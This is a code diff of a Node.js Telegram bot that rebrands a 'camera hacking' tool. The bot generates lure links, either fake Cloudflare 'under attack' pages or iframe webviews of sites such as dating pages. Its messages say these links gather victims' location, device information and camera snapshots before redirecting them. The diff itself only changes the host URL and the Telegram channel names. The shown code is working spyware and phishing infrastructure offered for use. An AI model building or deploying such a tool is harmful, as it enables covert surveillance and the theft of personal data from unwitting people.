@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="https://mybot.onlinoin.repl.co";
+var hostURL="UPDATE URL HERE";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/OnlineHacking");
+res.redirect("https://t.me/TechieGamer");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/OnlineHacking");
+res.redirect("https://t.me/TechieGamer");
 }
 
          
@@ -71,7 +71,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to Camera Hacking Bot people just through a simple link.\n\nIt can gather informations like location , device info, camera snaps.\n\nJoin @OnlineHacking for more tool.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to Camera Hacking Bot people just through a simple link.\n\nIt can gather informations like location , device info, camera snaps.\n\nJoin @TechieGamer for more tool.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
@@ -84,7 +84,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nJoin Telegram Channel: https://t.me/OnlineHacKing
+\n\nJoin Telegram Channel: https://t.me/TechieGamer
 `);
 }
   
@@ -137,11 +137,11 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @OnlineHacking\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @TechieGamer\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @OnlineHacking\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @TechieGamer\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
